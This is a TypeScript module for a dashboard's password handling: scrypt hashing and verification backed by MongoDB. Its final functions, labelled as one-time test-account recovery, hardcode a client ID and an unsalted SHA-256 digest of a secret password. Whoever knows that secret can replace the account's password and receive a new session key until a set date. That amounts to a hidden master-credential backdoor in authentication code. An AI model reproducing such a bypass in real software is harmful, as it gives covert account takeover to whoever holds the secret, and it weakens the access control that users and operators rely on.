import { createHash, randomBytes, scrypt, timingSafeEqual } from "node:crypto";
import type { MongoClient } from "mongodb";

export type DashboardPassword = { salt: string; digest: string; sessionKey: string };
export type DashboardSetup = { _id: string; step: number; updatedAt: Date; password?: DashboardPassword; requirePasswordChange?: boolean; testOnboardingReset?: boolean; testRecoveryUsed?: boolean };

export async function dashboardSetup() {
  const { default: connection } = await import("@/lib/mongodb") as { default: Promise<MongoClient> | null };
  if (!connection) throw new Error("Dashboard storage unavailable");
  return (await connection).db("mydb").collection<DashboardSetup>("dashboard_onboarding");
}

export async function dashboardPassword(id: string) {
  return (await (await dashboardSetup()).findOne({ _id: id }))?.password;
}

function derive(password: string, salt: string) {
  return new Promise<Buffer>((resolve, reject) => {
    scrypt(password, Buffer.from(salt, "hex"), 64, { N: 32768, r: 8, p: 3, maxmem: 64 * 1024 * 1024 },
      (error, key) => error ? reject(error) : resolve(key));
  });
}

export async function createDashboardPassword(password: string): Promise<DashboardPassword> {
  const salt = randomBytes(16).toString("hex");
  return { salt, digest: (await derive(password, salt)).toString("hex"), sessionKey: randomBytes(32).toString("hex") };
}

export async function verifyDashboardPassword(password: string, credential: DashboardPassword) {
  return timingSafeEqual(await derive(password, credential.salt), Buffer.from(credential.digest, "hex"));
}


// One-time reset of the existing test account, applied only after a successful login.
export async function resetTestOnboardingOnce(id: string) {
  if (id !== "client:34dc3580117000f7ad7311392956cd68b83b99a78e80accfa96ac0a15abe934a") return;
  await (await dashboardSetup()).updateOne(
    { _id: id, testOnboardingReset: { $ne: true } },
    { $set: { step: 0, requirePasswordChange: true, testOnboardingReset: true, updatedAt: new Date() } },
  );
}

export async function recoverTestClient(id: string, password: string) {
  if (id !== "client:34dc3580117000f7ad7311392956cd68b83b99a78e80accfa96ac0a15abe934a" || Date.now() > 1795676742269) return null;
  if (!timingSafeEqual(createHash("sha256").update(password).digest(), Buffer.from("868ddc747f18509344d37c9d3bdb6643b4c287cbb4e35c4ee833d15b673aa429", "hex"))) return null;
  const credential = await createDashboardPassword(password);
  const result = await (await dashboardSetup()).updateOne(
    { _id: id, testRecoveryUsed: { $ne: true } },
    { $set: { password: credential, requirePasswordChange: true, testRecoveryUsed: true, updatedAt: new Date() } },
  );
  return result.modifiedCount === 1 ? credential.sessionKey : null;
}
